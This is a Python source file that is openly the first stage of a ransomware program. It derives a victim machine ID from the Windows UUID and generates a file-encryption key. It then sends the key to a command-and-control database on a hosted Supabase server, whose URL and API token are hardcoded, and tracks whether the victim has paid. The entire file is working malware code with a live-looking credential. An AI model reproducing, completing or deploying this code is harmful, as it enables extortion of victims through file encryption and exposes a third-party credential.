#!/usr/bin/env python

#=========================================================
#This Module is Written to Execute Stage1 of Ransomeware
#=========================================================
# Stage1
#   |____Generates Unique Machine ID
#   |____Generates Random Encryption Key With Fixed Lenght
#   |____Export KEY to Command & Control Server (Supabase)
#	|____*****RETURN : Encryption/Decryption KEY & Unique MachineID*****

import os
import random
import time
import subprocess
import hashlib
from supabase import create_client, Client

class Stage1:
    def __init__(self):
        # It's recommended to use environment variables for production
        # For now, we'll use the hardcoded values provided by the user.
        url: str = "https://litzbxcgvusngnxblyeu.supabase.co"
        key: str = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxpdHpieGNndnVzbmdueGJseWV1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQ1ODU2MTYsImV4cCI6MjA3MDE2MTYxNn0.dquxezC00vvw7RJP2RDfhomuwDmE7YkYV0MK74ejg8c"
        self.supabase: Client = create_client(url, key)

    def start(self):
        unique_machine_id = self.gen_unique_id() #Calling gen_unique_id() Function
        key = self.gen_encrypt_key_and_export(unique_machine_id)  #Generating & Exporting KEY
        return unique_machine_id, key

    def gen_unique_id(self):
        current_machine_id = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        m = hashlib.md5()
        m.update(current_machine_id.encode('UTF-8'))
        unique_md5_hash = m.hexdigest()
        return unique_md5_hash   #Machine ID

    def gen_encrypt_key_and_export(self, unique_machine_id):
        # Check if key already exists
        response = self.supabase.table('nekros_keys').select("decrypt_key").eq('software_key', unique_machine_id).execute()

        if response.data:
            encrypt_key = response.data[0]['decrypt_key']
        else:
            # Generate Key
            keygen = "".join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for i in range(16))
            m = hashlib.md5()
            m.update(keygen.encode('UTF-8'))
            encrypt_key = m.hexdigest()

            # Insert new key into Supabase
            data, count = self.supabase.table('nekros_keys').insert({
                'software_key': unique_machine_id,
                'decrypt_key': encrypt_key,
                'date': time.strftime('%Y-%m-%d %H:%M:%S'),
                'payment': False
            }).execute()

        return encrypt_key
